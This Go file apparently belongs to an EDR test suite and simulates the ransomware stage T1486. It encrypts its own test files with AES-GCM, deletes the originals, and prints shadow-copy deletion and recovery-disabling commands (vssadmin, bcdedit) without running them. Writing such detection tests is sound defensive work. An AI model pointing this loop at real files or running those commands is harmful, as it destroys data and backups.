// stage-T1486.go - Stage 4: Data Encrypted for Impact
// Simulates ransomware encryption behavior (CRITICAL DETECTION POINT)

//go:build windows
// +build windows

package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strings"
	"time"
)

// Standardized exit codes
const (
	StageSuccess     = 0
	StageBlocked     = 126
	StageQuarantined = 105
	StageError       = 999
)

const ransomwareExtension = ".f0rtika"

func main() {
	// Attach to shared log
	if err := AttachLogger("5ed12ef2-5e29-49a2-8f26-269d8e9edcea", "Stage 4: T1486"); err != nil {
		fmt.Printf("[ERROR] Failed to attach logger: %v\n", err)
	}

	LogMessage("INFO", "T1486", "Starting Stage 4: Data Encrypted for Impact")

	// Attempt encryption simulation
	if err := simulateEncryption(); err != nil {
		LogMessage("ERROR", "T1486", fmt.Sprintf("Encryption blocked: %v", err))

		stageData := StageLog{
			StageID:       4,
			Technique:     "T1486",
			Name:          "Data Encrypted for Impact",
			StartTime:     time.Now(),
			EndTime:       time.Now(),
			DurationMs:    0,
			Status:        "blocked",
			ExitCode:      StageBlocked,
			BlockedReason: err.Error(),
		}
		AppendToSharedLog(stageData)

		fmt.Printf("[!] BLOCKED: %v\n", err)
		os.Exit(StageBlocked)
	}

	// Stage completed successfully
	LogMessage("SUCCESS", "T1486", "Encryption simulation successful - SYSTEM VULNERABLE")

	stageData := StageLog{
		StageID:    4,
		Technique:  "T1486",
		Name:       "Data Encrypted for Impact",
		StartTime:  time.Now(),
		EndTime:    time.Now(),
		DurationMs: 0,
		Status:     "success",
		ExitCode:   StageSuccess,
	}
	AppendToSharedLog(stageData)

	os.Exit(StageSuccess)
}

func simulateEncryption() error {
	fmt.Println("[*] Starting ransomware encryption simulation...")
	fmt.Println("[!] NOTE: This test only encrypts test files in C:\\F0")

	targetDir := "C:\\F0\\test_documents"

	// Ensure test directory exists with test files
	if err := createTestFiles(targetDir); err != nil {
		return fmt.Errorf("failed to create test environment: %v", err)
	}

	// Generate encryption key (simulated - in real ransomware this would be RSA-encrypted)
	key := make([]byte, 32) // AES-256
	if _, err := rand.Read(key); err != nil {
		return fmt.Errorf("key generation failed: %v", err)
	}

	fmt.Printf("[*] Generated encryption key: %x\n", key[:8]) // Show only first 8 bytes

	// Create AES cipher
	block, err := aes.NewCipher(key)
	if err != nil {
		return fmt.Errorf("cipher creation failed: %v", err)
	}

	// GCM mode for authenticated encryption
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return fmt.Errorf("GCM mode failed: %v", err)
	}

	// Track encryption metrics
	encryptedCount := 0
	failedCount := 0
	startTime := time.Now()

	// Simulate rapid file encryption (key ransomware behavior)
	fmt.Println("[*] Beginning rapid file encryption...")

	// Read target files
	files, err := os.ReadDir(targetDir)
	if err != nil {
		return fmt.Errorf("directory access blocked: %v", err)
	}

	for _, file := range files {
		if file.IsDir() {
			continue
		}

		filePath := filepath.Join(targetDir, file.Name())

		// Skip already encrypted files
		if strings.HasSuffix(file.Name(), ransomwareExtension) {
			continue
		}

		// Simulate encryption
		fmt.Printf("[*] Encrypting: %s\n", file.Name())

		// Read file content
		data, err := os.ReadFile(filePath)
		if err != nil {
			fmt.Printf("[!] Failed to read %s: %v\n", file.Name(), err)
			failedCount++
			continue
		}

		// Generate nonce
		nonce := make([]byte, gcm.NonceSize())
		if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
			failedCount++
			continue
		}

		// Encrypt data
		ciphertext := gcm.Seal(nonce, nonce, data, nil)

		// Write encrypted file with new extension
		encryptedPath := filePath + ransomwareExtension
		if err := os.WriteFile(encryptedPath, ciphertext, 0644); err != nil {
			// EDR might block the write
			return fmt.Errorf("EDR blocked encryption write for %s: %v", file.Name(), err)
		}

		// Delete original file (critical ransomware behavior)
		if err := os.Remove(filePath); err != nil {
			// EDR might prevent deletion
			fmt.Printf("[!] Could not delete original: %s\n", file.Name())
			// Continue anyway - partial encryption still counts
		}

		encryptedCount++
		LogFileDropped(file.Name()+ransomwareExtension, encryptedPath, int64(len(ciphertext)), false)

		// Rapid encryption without delays (aggressive behavior)
		// This pattern should trigger behavioral detection
		if encryptedCount%5 == 0 {
			fmt.Printf("[*] Progress: %d files encrypted...\n", encryptedCount)
		}
	}

	duration := time.Since(startTime)
	encryptionRate := float64(encryptedCount) / duration.Seconds()

	fmt.Printf("[*] Encryption complete:\n")
	fmt.Printf("    Files encrypted: %d\n", encryptedCount)
	fmt.Printf("    Files failed:    %d\n", failedCount)
	fmt.Printf("    Duration:        %.2f seconds\n", duration.Seconds())
	fmt.Printf("    Rate:            %.2f files/second\n", encryptionRate)

	// Check if encryption was blocked
	if encryptedCount == 0 {
		return fmt.Errorf("all encryption attempts blocked by EDR")
	}

	// Simulate key escrow (would normally be sent to C2)
	keyFile := filepath.Join("C:\\F0", "MASTER_KEY.key")
	keyData := fmt.Sprintf("RANSOMWARE_KEY:%x", key)
	if err := os.WriteFile(keyFile, []byte(keyData), 0644); err != nil {
		fmt.Printf("[!] Could not write key file: %v\n", err)
	}

	// Simulate volume shadow copy deletion attempt
	fmt.Println("[*] Attempting to delete volume shadow copies...")
	fmt.Println("[*] Would execute: vssadmin.exe delete shadows /all /quiet")
	// NOTE: We don't actually execute this destructive command

	// Simulate disabling recovery options
	fmt.Println("[*] Attempting to disable Windows recovery...")
	fmt.Println("[*] Would execute: bcdedit /set {default} bootstatuspolicy ignoreallfailures")
	fmt.Println("[*] Would execute: bcdedit /set {default} recoveryenabled no")
	// NOTE: We don't actually execute these destructive commands

	// Create encryption summary
	summaryPath := filepath.Join("C:\\F0", "ENCRYPTION_COMPLETE.txt")
	summary := fmt.Sprintf(
		"RANSOMWARE SIMULATION - ENCRYPTION COMPLETE\n"+
			"Time: %s\n"+
			"Files Encrypted: %d\n"+
			"Encryption Rate: %.2f files/sec\n"+
			"Extension: %s\n",
		time.Now().Format("2006-01-02 15:04:05"),
		encryptedCount,
		encryptionRate,
		ransomwareExtension,
	)

	if err := os.WriteFile(summaryPath, []byte(summary), 0644); err != nil {
		fmt.Printf("[!] Could not write summary: %v\n", err)
	}

	fmt.Println("[+] Stage 4 completed - Encryption successful")
	fmt.Println("[!] CRITICAL: System failed to prevent ransomware encryption!")

	return nil
}

func createTestFiles(dir string) error {
	// Ensure directory exists
	if err := os.MkdirAll(dir, 0755); err != nil {
		return err
	}

	// Create various test files if they don't exist
	testFiles := map[string]string{
		"report.docx":      "DOCUMENT: Annual Report 2024",
		"budget.xlsx":      "SPREADSHEET: Q4 Budget Analysis",
		"presentation.pptx": "PRESENTATION: Board Meeting Slides",
		"database.db":      "DATABASE: Customer Information",
		"backup.zip":       "ARCHIVE: System Backup Files",
		"source.cpp":       "CODE: Application Source Code",
		"config.json":      "CONFIG: Application Settings",
		"notes.txt":        "TEXT: Important Notes",
		"invoice.pdf":      "PDF: Invoice #12345",
		"credentials.txt":  "SENSITIVE: Login Credentials",
	}

	for filename, content := range testFiles {
		filePath := filepath.Join(dir, filename)

		// Check if already encrypted
		if _, err := os.Stat(filePath + ransomwareExtension); err == nil {
			continue // Skip if already encrypted
		}

		// Create file if it doesn't exist
		if _, err := os.Stat(filePath); os.IsNotExist(err) {
			if err := os.WriteFile(filePath, []byte(content), 0644); err != nil {
				return err
			}
		}
	}

	return nil
}